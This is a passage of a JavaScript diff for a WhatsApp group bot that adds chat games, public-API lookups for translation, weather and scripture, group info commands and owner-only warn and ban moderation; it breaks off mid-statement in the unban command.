+                const HANG = ["⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦🟪⬜⬜⬜","💀 DEAD"];
+                if (!hangmanState[from] || parts[1]?.toLowerCase() === "start" || parts[1]?.toLowerCase() === "new") {
+                    const word = HANGMAN_WORDS[Math.floor(Math.random() * HANGMAN_WORDS.length)];
+                    hangmanState[from] = { word, guessed: [], wrong: 0 };
+                    const display = word.split("").map(l => "_").join(" ");
+                    return reply(`🎯 *HANGMAN!*\n\nWord: *${display}*\nWrong guesses: 0/6\n\n${HANG[0]}\n\nType *.hangman <letter>* to guess!`);
+                }
+                if (parts[1]?.toLowerCase() === "stop") { delete hangmanState[from]; return reply("🛑 Hangman stopped."); }
+                const hState = hangmanState[from];
+                const letter = parts[1]?.toLowerCase().replace(/[^a-z]/g,"");
+                if (!letter || letter.length !== 1) return reply("Type *.hangman <single letter>* to guess, or *.hangman new* to start.");
+                if (hState.guessed.includes(letter)) return reply(`⚠️ You already guessed *${letter}*! Try a different letter.`);
+                hState.guessed.push(letter);
+                if (!hState.word.includes(letter)) hState.wrong++;
+                const display = hState.word.split("").map(l => hState.guessed.includes(l) ? l.toUpperCase() : "_").join(" ");
+                const isWon = hState.word.split("").every(l => hState.guessed.includes(l));
+                const isLost = hState.wrong >= 6;
+                if (isWon) { delete hangmanState[from]; return reply(`🎉 *YOU WIN!*\n\nWord: *${hState.word.toUpperCase()}*\n\nCongratulations! Type *.hangman new* to play again.`); }
+                if (isLost) { delete hangmanState[from]; return reply(`💀 *GAME OVER!*\n\nThe word was: *${hState.word.toUpperCase()}*\n\n${HANG[6]}\n\nType *.hangman new* to try again.`); }
+                await reply(`🎯 *HANGMAN*\n\nWord: *${display}*\nGuessed: ${hState.guessed.join(", ")}\nWrong: ${hState.wrong}/6\n\n${HANG[hState.wrong]}`);
+                break;
+            }
+
+            // --- NUMBER GUESSING GAME ---
+            case ".numguess": {
+                if (numGuessState[from]) {
+                    const ng = numGuessState[from];
+                    const guess = parseInt(parts[1]);
+                    if (isNaN(guess)) return reply(`🔢 *Number Guess Active!*\n\nGuess a number between *1 and 100*.\nAttempts used: *${ng.attempts}*\nType *.numguess <number>*`);
+                    ng.attempts++;
+                    if (guess === ng.number) {
+                        delete numGuessState[from];
+                        return reply(`🎉 *CORRECT!* The number was *${ng.number}*!\n\nYou got it in *${ng.attempts} attempt${ng.attempts > 1 ? "s" : ""}*! ${ng.attempts <= 5 ? "🏆 Impressive!" : ng.attempts <= 10 ? "👍 Nice!" : "Keep practicing!"}`);
+                    }
+                    const hint = guess < ng.number ? "📈 Too low! Go higher." : "📉 Too high! Go lower.";
+                    return reply(`${hint}\n\nAttempts: *${ng.attempts}*\nType *.numguess <number>* to keep guessing.\nGive up? *.numguess stop*`);
+                }
+                if (parts[1]?.toLowerCase() === "stop") { delete numGuessState[from]; return reply("🛑 Number guess game ended."); }
+                const secret = Math.floor(Math.random() * 100) + 1;
+                numGuessState[from] = { number: secret, attempts: 0 };
+                await reply(`🔢 *NUMBER GUESS GAME!*\n\nI'm thinking of a number between *1 and 100*.\nCan you guess it?\n\nType *.numguess <number>* to guess!\nType *.numguess stop* to give up.`);
+                break;
+            }
+
+            // --- RIDDLE ---
+            case ".riddle": {
+                if (triviaState[`riddle_${from}`]) {
+                    const r = triviaState[`riddle_${from}`];
+                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
+                    if (parts[1]?.toLowerCase() === "skip") {
+                        delete triviaState[`riddle_${from}`];
+                        return reply(`⏭️ Skipped! The answer was: *${r.a}*`);
+                    }
+                    if (!ans) return reply(`🧩 *Current Riddle:*\n\n_${r.q}_\n\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip*`);
+                    if (ans === r.a) {
+                        delete triviaState[`riddle_${from}`];
+                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${r.a}*\n\nWell done! Try *.riddle* for another one.`);
+                    }
+                    return reply(`❌ Wrong! Try again.\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip* to give up.`);
+                }
+                const rd = RIDDLES[Math.floor(Math.random() * RIDDLES.length)];
+                triviaState[`riddle_${from}`] = rd;
+                await reply(`🧩 *RIDDLE TIME!*\n\n_${rd.q}_\n\n💡 Hint: ${rd.hint}\n\nType *.riddle <your answer>* to answer!`);
+                break;
+            }
+
+            // --- MATH QUIZ ---
+            case ".mathquiz": {
+                const ops = ["+", "-", "*"];
+                const op = ops[Math.floor(Math.random() * 3)];
+                const a = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
+                const b = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
+                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
+                const opName = op === "+" ? "plus" : op === "-" ? "minus" : "times";
+                await reply(`🧮 *MATH QUIZ!*\n\nWhat is *${a} ${op} ${b}*?\n\n_(${a} ${opName} ${b})_\n\nType your answer — first correct reply wins!\n⚡ _Answer: ||${ans}||_`);
+                break;
+            }
+
+            // --- WOULD YOU RATHER ---
+            case ".wouldurather":
+            case ".wyr": {
+                const wyr = WOULD_U_RATHER[Math.floor(Math.random() * WOULD_U_RATHER.length)];
+                const [optA, optB] = wyr.split(" OR ");
+                await reply(`🤔 *WOULD YOU RATHER?*\n\n${wyr}\n\n*A)* ${optA.replace("Would you rather ", "").trim()}\n*B)* ${optB?.trim() || "..."}\n\nReply A or B! 👇`);
+                break;
+            }
+
+            // --- WORD SCRAMBLE ---
+            case ".scramble": {
+                if (scrambleState[from]) {
+                    const sc = scrambleState[from];
+                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
+                    if (parts[1]?.toLowerCase() === "skip") {
+                        delete scrambleState[from];
+                        return reply(`⏭️ Skipped! The word was: *${sc.word.toUpperCase()}*`);
+                    }
+                    if (!ans) return reply(`🔀 *Scrambled:* *${sc.scrambled}*\n\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
+                    if (ans === sc.word) {
+                        delete scrambleState[from];
+                        return reply(`✅ *CORRECT!* 🎉\n\nThe word was: *${sc.word.toUpperCase()}*\n\nWell unscrambled! Try *.scramble* for another.`);
+                    }
+                    return reply(`❌ Wrong! Try again.\n🔀 Scrambled: *${sc.scrambled}*\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
+                }
+                const sw = SCRAMBLE_WORDS[Math.floor(Math.random() * SCRAMBLE_WORDS.length)];
+                const scrambled = sw.word.split("").sort(() => Math.random() - 0.5).join("").toUpperCase();
+                scrambleState[from] = { word: sw.word, scrambled, hint: sw.hint };
+                await reply(`🔀 *WORD SCRAMBLE!*\n\nUnscramble this word:\n\n*${scrambled}*\n\n💡 Hint: ${sw.hint}\n\nType *.scramble <your answer>*\nGive up? *.scramble skip*`);
+                break;
+            }
+
+            // --- HOROSCOPE ---
+            case ".horoscope": {
+                const sign = parts[1]?.toLowerCase().trim();
+                const signs = Object.keys(HOROSCOPES);
+                if (!sign || !HOROSCOPES[sign]) {
+                    return reply(`♈ *HOROSCOPE*\n\nType *.horoscope <sign>*\n\nAvailable signs:\n${signs.map(s => `• ${s}`).join("\n")}`);
+                }
+                await reply(`✨ *Daily Horoscope*\n\n${HOROSCOPES[sign]}\n\n_✨ Phantom X Horoscope — ${new Date().toDateString()}_`);
+                break;
+            }
+
+            // --- SHIP (love calculator) ---
+            case ".ship": {
+                const shipMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                if (shipMentioned.length < 2) {
+                    const names = parts.slice(1).join(" ").split("&").map(n => n.trim());
+                    if (names.length < 2 || !names[1]) return reply("Usage: .ship @person1 @person2\nOr: .ship Name1 & Name2");
+                    const pct = Math.floor(Math.random() * 101);
+                    const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
+                    const msg2 = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
+                    return reply(`💘 *SHIP CALCULATOR*\n\n${names[0]} ❤️ ${names[1]}\n\n${bar}\n*${pct}% compatible*\n\n${msg2}`);
+                }
+                const n1 = `@${shipMentioned[0].split("@")[0]}`;
+                const n2 = `@${shipMentioned[1].split("@")[0]}`;
+                const pct = Math.floor(Math.random() * 101);
+                const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
+                const result = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
+                await sock.sendMessage(from, { text: `💘 *SHIP CALCULATOR*\n\n${n1} ❤️ ${n2}\n\n${bar}\n*${pct}% compatible*\n\n${result}`, mentions: shipMentioned }, { quoted: msg });
+                break;
+            }
+
+            // --- RATE (random rate out of 100) ---
+            case ".rate": {
+                const rateMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const rateName = rateMentioned.length ? `@${rateMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const rate = Math.floor(Math.random() * 101);
+                const bar = "🟩".repeat(Math.floor(rate / 10)) + "⬜".repeat(10 - Math.floor(rate / 10));
+                const rateMsg = rate >= 90 ? "🏆 Absolutely elite!" : rate >= 70 ? "🔥 Very impressive!" : rate >= 50 ? "👍 Above average!" : rate >= 30 ? "😐 Room to grow." : "💀 Rough day...";
+                await sock.sendMessage(from, { text: `📊 *RATE*\n\n${rateName} rated:\n\n${bar}\n*${rate}/100*\n\n${rateMsg}`, mentions: rateMentioned }, { quoted: msg });
+                break;
+            }
+
+            // --- VIBE CHECK ---
+            case ".vibe": {
+                const vibes = ["☀️ Immaculate vibes — you're radiating today!", "🔥 On fire! The energy is unmatched.", "💜 Calm, cool, collected. Major main character energy.", "🌊 Chill vibes only. You're in your element.", "😤 Slightly off today but still dangerous.", "🌧️ Cloudy vibes. Take a breather.", "⚡ Electric! People feel your presence.", "🫥 Invisible mode activated. Might be plotting something.", "🤡 Chaotic vibes. Wild but entertaining.", "👑 Royal vibes. No further questions."];
+                const vibeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const vibeName = vibeMentioned.length ? `@${vibeMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const vibe = vibes[Math.floor(Math.random() * vibes.length)];
+                await sock.sendMessage(from, { text: `✨ *VIBE CHECK*\n\n${vibeName}\n\n${vibe}`, mentions: vibeMentioned }, { quoted: msg });
+                break;
+            }
+
+            // --- JOKE ---
+            case ".joke": {
+                await reply(`😂 *Random Joke*\n\n${JOKES[Math.floor(Math.random() * JOKES.length)]}`);
+                break;
+            }
+
+            // --- FACT ---
+            case ".fact": {
+                await reply(`📚 *Fun Fact*\n\n${FACTS[Math.floor(Math.random() * FACTS.length)]}`);
+                break;
+            }
+
+            // --- QUOTE ---
+            case ".quote": {
+                await reply(`✨ *Quote of the Moment*\n\n${QUOTES[Math.floor(Math.random() * QUOTES.length)]}`);
+                break;
+            }
+
+            // --- ROAST ---
+            case ".roast": {
+                const roastTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+                const name = roastTarget ? `@${roastTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const roast = ROASTS[Math.floor(Math.random() * ROASTS.length)];
+                await sock.sendMessage(from, { text: `🔥 *Roast for ${name}:*\n\n${roast}`, mentions: roastTarget ? [roastTarget] : [] }, { quoted: msg });
+                break;
+            }
+
+            // --- COMPLIMENT ---
+            case ".compliment": {
+                const compTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+                const cname = compTarget ? `@${compTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const comp = COMPLIMENTS[Math.floor(Math.random() * COMPLIMENTS.length)];
+                await sock.sendMessage(from, { text: `💛 *Compliment for ${cname}:*\n\n${comp}`, mentions: compTarget ? [compTarget] : [] }, { quoted: msg });
+                break;
+            }
+
+            // --- TRANSLATE (MyMemory free API) ---
+            case ".translate":
+            case ".tr": {
+                const trParts = parts.slice(1);
+                if (trParts.length < 2) return reply(
+                    "Usage: .translate <lang_code> <text>\n\n" +
+                    "Example: .translate fr Good morning everyone\n\n" +
+                    "Common language codes:\n" +
+                    "• fr — French\n• es — Spanish\n• de — German\n• ar — Arabic\n" +
+                    "• zh — Chinese\n• pt — Portuguese\n• ru — Russian\n• ja — Japanese\n" +
+                    "• yo — Yoruba\n• ha — Hausa\n• sw — Swahili\n• ig — Igbo\n\n" +
+                    "_Tip: You can also use full language names like 'french'_"
+                );
+                const toLang = trParts[0].toLowerCase();
+                const trText = trParts.slice(1).join(" ");
+                await reply(`🌐 Translating to *${toLang}*...`);
+                try {
+                    const encoded = encodeURIComponent(trText);
+                    const trResult = await new Promise((resolve, reject) => {
+                        https.get(`https://api.mymemory.translated.net/get?q=${encoded}&langpair=en|${toLang}`, (res) => {
+                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
+                                try {
+                                    const p = JSON.parse(data);
+                                    const translated = p.responseData?.translatedText || "";
+                                    if (!translated || p.responseStatus === 400 || translated.toLowerCase().includes("invalid")) {
+                                        reject(new Error(`Language code '${toLang}' not recognized. Use a valid ISO code like fr, es, ar, yo, ha.`));
+                                    } else {
+                                        resolve(translated);
+                                    }
+                                } catch { reject(new Error("Parse error")); }
+                            });
+                        }).on("error", reject);
+                    });
+                    await reply(`🌐 *Translation (${toLang}):*\n\n_${trText}_\n\n➡️ *${trResult}*`);
+                } catch (e) { await reply(`❌ Translation failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- WEATHER (wttr.in free API) ---
+            case ".weather":
+            case ".wx": {
+                const city = parts.slice(1).join(" ").trim();
+                if (!city) return reply("Usage: .weather Lagos\nExample: .weather Abuja");
+                await reply(`🌤️ Fetching weather for *${city}*...`);
+                try {
+                    const wxResult = await new Promise((resolve, reject) => {
+                        https.get(`https://wttr.in/${encodeURIComponent(city)}?format=4`, (res) => {
+                            let data = ""; res.on("data", c => data += c); res.on("end", () => resolve(data.trim()));
+                        }).on("error", reject);
+                    });
+                    await reply(`🌍 *Weather: ${city}*\n\n${wxResult}\n\n_Powered by wttr.in_`);
+                } catch (e) { await reply(`❌ Weather fetch failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- BIBLE (bible-api.com free) ---
+            case ".bible": {
+                const bRef = parts.slice(1).join(" ").trim();
+                const bQuery = bRef || "john 3:16";
+                await reply(`📖 Fetching *${bQuery}*...`);
+                try {
+                    const bVerse = await new Promise((resolve, reject) => {
+                        https.get(`https://bible-api.com/${encodeURIComponent(bQuery)}`, (res) => {
+                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
+                                try { const p = JSON.parse(data); resolve(p.text ? { ref: p.reference, text: p.text.trim() } : null); } catch { reject(new Error("Parse")); }
+                            });
+                        }).on("error", reject);
+                    });
+                    if (!bVerse) return reply("❌ Verse not found. Example: .bible John 3:16");
+                    await reply(`📖 *${bVerse.ref}*\n\n_"${bVerse.text}"_\n\n_— Holy Bible (KJV)_`);
+                } catch (e) { await reply(`❌ Bible fetch failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- QURAN (alquran.cloud free API) ---
+            case ".quran": {
+                const qInput = parts.slice(1).join(":").trim();
+                const [surahStr, ayahStr] = qInput.split(":").map(s => s?.trim());
+                const surah = parseInt(surahStr) || 1;
+                const ayah = parseInt(ayahStr) || 1;
+                await reply(`📗 Fetching Surah *${surah}*, Ayah *${ayah}*...`);
+                try {
+                    const [arResult, enResult] = await Promise.all([
+                        new Promise((resolve, reject) => {
+                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}`, (res) => {
+                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
+                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
+                                });
+                            }).on("error", reject);
+                        }),
+                        new Promise((resolve, reject) => {
+                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/en.asad`, (res) => {
+                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
+                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
+                                });
+                            }).on("error", reject);
+                        }),
+                    ]);
+                    if (!arResult) return reply("❌ Ayah not found. Example: .quran 2:255");
+                    const surahName = arResult.surah?.englishName || `Surah ${surah}`;
+                    await reply(`📗 *${surahName} — Ayah ${ayah}*\n\n*Arabic:*\n${arResult.text}\n\n*English:*\n_"${enResult?.text || "Translation unavailable."}"_`);
+                } catch (e) { await reply(`❌ Quran fetch failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- GROUP INFO ---
+            case ".groupinfo": {
+                if (!isGroup) return reply("❌ This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const admins = meta.participants.filter(p => p.admin);
+                    const created = new Date(meta.creation * 1000).toLocaleDateString("en-NG");
+                    const shortId = from.split("@")[0].slice(0, 14) + "...";
+                    await reply(buildOmegaTerminal(
+                        `   ┌── *REALM_METADATA* ──┐\n` +
+                        `   ╿\n` +
+                        `   ┝  *NAME* : ${meta.subject}\n` +
+                        `   ┝  *ID* : ${shortId}@g.us\n` +
+                        `   ┝  *VESSELS* : ${meta.participants.length}_TOTAL\n` +
+                        `   ┝  *ADMINS* : ${String(admins.length).padStart(2,"0")}_LOGGED\n` +
+                        `   ┝  *CREATED* : ${created}\n` +
+                        `   ┝  *DESC* : ${(meta.desc || "NONE").slice(0,40)}\n` +
+                        `   ╿\n` +
+                        `   └── *INTEGRITY: SECURE* ──┘\n\n` +
+                        `   " *I know every corner of*\n     *this digital space. No*\n     *one moves without my*\n     *sensors detecting it.* "`
+                    ));
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- ADMIN LIST ---
+            case ".adminlist": {
+                if (!isGroup) return reply("❌ This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const admins = meta.participants.filter(p => p.admin);
+                    if (!admins.length) return reply("No admins found.");
+                    let rows = ``;
+                    admins.forEach((a, i) => {
+                        rows += `   ${i + 1 < 10 ? "0" + (i+1) : i+1}. @${a.id.split("@")[0]} ${a.admin === "superadmin" ? "👑" : "🛡️"}\n`;
+                    });
+                    await sock.sendMessage(from, {
+                        text: buildOmegaTerminal(
+                            `   ◈━━━ THRONE_REGISTER ━━━◈\n\n` +
+                            `   📍 REALM : ${meta.subject}\n` +
+                            `   🛡️ TOTAL : ${String(admins.length).padStart(2,"0")}_LOGGED\n\n` +
+                            rows.trimEnd() + `\n\n` +
+                            `   " Power is given to those\n     who already earned it\n     in silence. "`
+                        ),
+                        mentions: admins.map(a => a.id)
+                    }, { quoted: msg });
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- MEMBER COUNT ---
+            case ".membercount": {
+                if (!isGroup) return reply("❌ This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const admins = meta.participants.filter(p => p.admin).length;
+                    await reply(buildOmegaTerminal(
+                        `   〔 CENSUS_PROTOCOL 〕\n\n` +
+                        `   👥  VESSELS   ──  ${meta.participants.length}_TOTAL\n` +
+                        `   👑  THRONES   ──  ${String(admins).padStart(2,"0")}_LOGGED\n` +
+                        `   🌐  REALM     ──  ${meta.subject}\n\n` +
+                        `   " The collective knows\n     every soul within\n     its walls. "`
+                    ));
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- EVERYONE (tag all members) ---
+            case ".everyone":
+            case ".all": {
+                if (!isGroup) return reply("❌ This command only works in groups.");
+                const evMsg = parts.slice(1).join(" ").trim() || "📢 *Attention everyone!*";
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const members = meta.participants.map(p => p.id);
+                    const mentionText = members.map(j => `@${j.split("@")[0]}`).join(" ");
+                    await sock.sendMessage(from, { text: `${evMsg}\n\n${mentionText}`, mentions: members }, { quoted: msg });
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- SET STATUS (WhatsApp about) ---
+            case ".setstatus": {
+                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
+                const statusText = parts.slice(1).join(" ").trim();
+                if (!statusText) return reply("Usage: .setstatus <your new status>");
+                try {
+                    await sock.updateProfileStatus(statusText);
+                    await reply(`✅ Status updated to:\n_${statusText}_`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- SET NAME (WhatsApp display name) ---
+            case ".setname": {
+                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
+                const newName = parts.slice(1).join(" ").trim();
+                if (!newName) return reply("Usage: .setname <new name>");
+                try {
+                    await sock.updateProfileName(newName);
+                    await reply(`✅ Display name updated to: *${newName}*`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- SET WHATSAPP PROFILE PICTURE ---
+            case ".setwpp": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const quotedRawWpp = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedTypeWpp = quotedRawWpp ? getContentType(quotedRawWpp) : null;
+                const directImageWpp = msg.message?.imageMessage ? msg.message : null;
+                const useQuotedWpp = quotedRawWpp && quotedTypeWpp === "imageMessage";
+                if (!useQuotedWpp && !directImageWpp) return reply("🖼️ *Set WhatsApp Profile Picture*\n\nReply to an image or send one with caption *.setwpp* to set it as the bot's profile pic.");
+                try {
+                    const sourceWpp = useQuotedWpp ? { ...msg, message: quotedRawWpp } : msg;
+                    const bufWpp = await downloadMediaMessage(sourceWpp, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (!bufWpp || bufWpp.length < 1000) return reply("❌ Image download failed. Try sending the image again.");
+                    await sock.updateProfilePicture(sock.user.id, bufWpp);
+                    await reply(buildOmegaTerminal(
+                        `   ┎⊷ 【 👁️ *IDENTITY_SHIFT* 】\n` +
+                        `   ┃\n` +
+                        `   ┃ 💠 *TARGET* : PROFILE_IMAGE\n` +
+                        `   ┃ 📥 *ACTION* : VISUAL_UPDATE\n` +
+                        `   ┃ ✅ *RESULT* : COMPLETE\n` +
+                        `   ┃\n` +
+                        `   ┖───────────────────────────╼\n\n` +
+                        `   " *The face of the void*\n     *has been reborn.* "`
+                    ));
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- GET PROFILE PICTURE ---
+            case ".getpp":
+            case ".pfp": {
+                const ppTarget = resolveTargetJid(msg, parts) || senderJid;
+                try {
+                    const ppUrl = await sock.profilePictureUrl(ppTarget, "image");
+                    const ppBuf = await fetchBuffer(ppUrl);
+                    const ppNum = ppTarget.split("@")[0];
+                    await sock.sendMessage(from, {
+                        image: ppBuf,
+                        caption: buildOmegaTerminal(
+                            `   ░▒▓█ *VISUAL_EXTRACT* █▓▒░\n\n` +
+                            `   [ 👁️ ] *TARGET* : +${ppNum}\n` +
+                            `   [ 📸 ] *ACTION* : PROFILE_PIC_PULL\n` +
+                            `   [ ✅ ] *RESULT* : ACQUIRED\n\n` +
+                            `   " *No face is hidden*\n     *from the all-seeing eye.* "`
+                        )
+                    }, { quoted: msg });
+                } catch (e) {
+                    await reply(`❌ Could not fetch profile picture. They may have privacy settings on, or the number is invalid.\n\nError: ${e?.message}`);
+                }
+                break;
+            }
+
+            // --- GET GROUP PROFILE PICTURE ---
+            case ".grouppic": {
+                if (!isGroup) return reply("❌ Only works inside a group.");
+                try {
+                    const gpUrl = await sock.profilePictureUrl(from, "image");
+                    const gpBuf = await fetchBuffer(gpUrl);
+                    let gpName = from;
+                    try { const gpMeta = await sock.groupMetadata(from); gpName = gpMeta.subject; } catch {}
+                    await sock.sendMessage(from, {
+                        image: gpBuf,
+                        caption: buildOmegaTerminal(
+                            `   ░▒▓█ *GROUP_VISUAL_EXTRACT* █▓▒░\n\n` +
+                            `   [ 👁️ ] *GROUP* : ${gpName}\n` +
+                            `   [ 📸 ] *ACTION* : GROUP_PIC_PULL\n` +
+                            `   [ ✅ ] *RESULT* : ACQUIRED\n\n` +
+                            `   " *Every domain has a face.*\n     *This one belongs to us.* "`
+                        )
+                    }, { quoted: msg });
+                } catch (e) {
+                    await reply(`❌ Could not fetch group picture. The group may not have one set.\n\nError: ${e?.message}`);
+                }
+                break;
+            }
+
+            // --- WARN ---
+            case ".warn": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                const warnTarget = resolveTargetJid(msg, parts);
+                if (!warnTarget) return reply(eclipseSay("bad_use") + "\nuse: .warn @user, .warn <number>, or reply to their message");
+                const wCount = addWarn(from, warnTarget);
+                if (wCount >= 3) {
+                    resetWarns(from, warnTarget);
+                    try { await sock.groupParticipantsUpdate(from, [warnTarget], "remove"); } catch (_) {}
+                    await sock.sendMessage(from, {
+                        text: buildOmegaTerminal(
+                            `   ⛓️ EXILE_TRIGGERED\n\n` +
+                            `   🎯  TARGET   →  @${warnTarget.split("@")[0]}\n` +
+                            `   ⚠️  WARNS    →  3/3 REACHED\n` +
+                            `   🚫  ACTION   →  EXPELLED\n\n` +
+                            `   " Three strikes.\n     The collective has\n     spoken. You are done. "`
+                        ),
+                        mentions: [warnTarget]
+                    }, { quoted: msg });
+                } else {
+                    await sock.sendMessage(from, {
+                        text: buildOmegaTerminal(
+                            `   ⚠️ WARNING_ISSUED\n\n` +
+                            `   🎯  TARGET   →  @${warnTarget.split("@")[0]}\n` +
+                            `   📊  TALLY    →  ${wCount}/3 MARKS\n` +
+                            `   ⚡  STATUS   →  MARKED\n\n` +
+                            `   " Marked. ${"█".repeat(wCount)}${"░".repeat(3 - wCount)} — ${wCount === 2 ? "one more and you are cast out." : "consider this a shadow."} "`
+                        ),
+                        mentions: [warnTarget]
+                    }, { quoted: msg });
+                }
+                break;
+            }
+
+            // --- WARNLIST ---
+            case ".warnlist": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                const warnData = getAllWarns(from);
+                const entries = Object.entries(warnData).filter(([, v]) => v > 0);
+                if (!entries.length) return reply(buildOmegaTerminal(
+                    `   ✅ WARNING_LEDGER — CLEAN\n\n` +
+                    `   📋  MARKS  →  NONE_RECORDED\n\n` +
+                    `   " No shadows hang here.\n     This realm is clear. "`
+                ));
+                let wRows = "";
+                entries.forEach(([jid, count]) => {
+                    wRows += `   @${jid.split("@")[0]} — ${"█".repeat(count)}${"░".repeat(3-count)} ${count}/3\n`;
+                });
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   ⚠️ WARNING_LEDGER\n\n` +
+                        wRows.trimEnd() + `\n\n` +
+                        `   " Marks collect in silence.\n     Three and they are\n     cast from the void. "`
+                    ),
+                    mentions: entries.map(([j]) => j)
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- RESETWARN ---
+            case ".resetwarn": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                if (!msg.key.fromMe) return reply("❌ Only the bot owner can reset warnings.");
+                const rwTarget = resolveTargetJid(msg, parts);
+                if (!rwTarget) return reply("Usage: .resetwarn @user, .resetwarn <number>, or reply to their message");
+                resetWarns(from, rwTarget);
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   ✦ MARK_ERASED\n\n` +
+                        `   🎯  TARGET  →  @${rwTarget.split("@")[0]}\n` +
+                        `   🗑️  WARNS   →  CLEARED\n` +
+                        `   📊  TALLY   →  0/3\n\n` +
+                        `   " The mark is gone.\n     A second chance given\n     at the void's discretion. "`
+                    ),
+                    mentions: [rwTarget]
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- BAN ---
+            case ".ban": {
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                const banTarget = resolveTargetJid(msg, parts);
+                if (!banTarget) return reply(eclipseSay("bad_use") + "\nuse: .ban @user, .ban <number>, or reply to their message");
+                if (botJid) addBan(botJid, banTarget);
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   ▓▓▓▓ EXILE_PROTOCOL ▓▓▓▓\n\n` +
+                        `   ⛓️  TARGET   →  @${banTarget.split("@")[0]}\n` +
+                        `   🚫  ACTION   →  BANISHED\n` +
+                        `   🔐  SCOPE    →  PERMANENT\n\n` +
+                        `   " Some are cast out not\n     as punishment — but as\n     protection for the rest. "`
+                    ),
+                    mentions: [banTarget]
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- UNBAN ---
+            case ".unban": {
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                const unbanTarget = resolveTargetJid(msg, parts);
+                if (!unbanTarget) return reply(eclipseSay("bad_use") + "\nuse: .unban @user, .unban <number>, or reply to their message");
+                if (botJid) removeBan(botJid, unbanTarget);
+                await sock.sendMessage(from, {
